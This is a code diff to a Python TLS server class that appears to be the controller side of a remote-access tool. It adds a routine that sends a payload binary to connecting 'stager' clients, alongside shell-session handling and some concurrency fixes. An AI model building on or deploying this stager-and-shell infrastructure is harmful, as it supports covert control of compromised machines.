@@ -25,6 +25,8 @@ class Server(object):
         self.port = None
         self.ip = None
 
+        self.is_processing = False
+
     def gen_cert(self):
         key_pair = crypto.PKey()
         key_pair.generate_key(crypto.TYPE_RSA, 2048)
@@ -37,7 +39,7 @@ class Server(object):
         cert.get_subject().L = 'Los Santos'
         cert.get_subject().ST = 'California'
 
-        cert.set_serial_number(randint(2048 ** 8, 4096 ** 8))
+        cert.set_serial_number(SystemRandom().randint(2048 ** 8, 4096 ** 8))
         cert.gmtime_adj_notBefore(0)
         cert.gmtime_adj_notAfter(256 * 409600)
         cert.set_issuer(cert.get_subject())
@@ -51,11 +53,17 @@ class Server(object):
             f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key_pair))
 
     def server_start(self):
+        if self.is_processing:
+            return
+
+        self.is_processing = True
+
         self.gen_cert()
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(const.CERT_FILE, const.KEY_FILE)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
         try:
             sock.bind((self.ip, self.port))
             self.is_active = True
@@ -68,12 +76,23 @@ class Server(object):
             self.display_text('Error: invalid IP')
             self.port = None
             self.ip = None
+        finally:
+            self.is_processing = False
 
     def server_stop(self):
-        if not self.is_active:
+        if self.is_processing:
             return
+
+        self.is_processing = True
+
+        if not self.is_active:
+            self.is_processing = False
+            return
+
         self.is_active = False
         self.interface.close()
+
+        self.is_processing = False
         self.ip, self.port = None, None
 
     def manage_conn_info(self, sess_obj, conn_info):
@@ -102,18 +121,57 @@ class Server(object):
         shell_thread.daemon = True
         shell_thread.start()
 
+    def send_payload(self, sess):
+        '''Send payload to stager
+        '''
+
+        if not path.exists(const.PAYLOAD_PATH):
+            print('Payload binary does not exist; please generate it')
+            return
+
+        with open(const.PAYLOAD_PATH, 'rb') as f:
+            while True:
+                data = f.read(const.BLOCK_SIZE)
+
+                if data:
+                    sess.sendall(data)
+                else:
+                    break
+
+    def examine_conn(self, s, conn_info):
+
+        if type(conn_info) != dict:
+            print('Client did not supply a proper data type')
+            return
+
+        if not 'code' in conn_info or not 'args' in conn_info:
+            print('Client did not supply both code and args')
+            return
+
+        if conn_info['code'] == None:
+            print('Client supplied no code')
+            return
+
+        if conn_info['code'] == const.STAGER_CODE:
+            self.send_payload(s.session)
+            return
+
+        if conn_info['code'] == const.CONN_CODE:
+            print('Establishing a secure connection ...')
+            self.manage_conn_info(s, conn_info)
+
     def establish_conn(self, sess, ip):
         s = session.Session(sess, ip)
         conn_info = s.initial_communication()
-        self.manage_conn_info(s, conn_info)
+
+        if conn_info:
+            self.examine_conn(s, conn_info)
 
     def waiting_conn_manager(self):
         while self.is_active:
             if self.waiting_conn.qsize():
                 session, ip = self.waiting_conn.get()
                 sleep(0.5)
-
-                print('Establishing a secure connection ...')
                 self.establish_conn(session, ip)
 
     def server_loop(self):
@@ -154,7 +212,3 @@ class Server(object):
             self.server_stop()
             sleep(1.2)
         return self.is_active
-
-
-def randint(a: int, b: int) -> int:
-    return SystemRandom().randint(a, b)
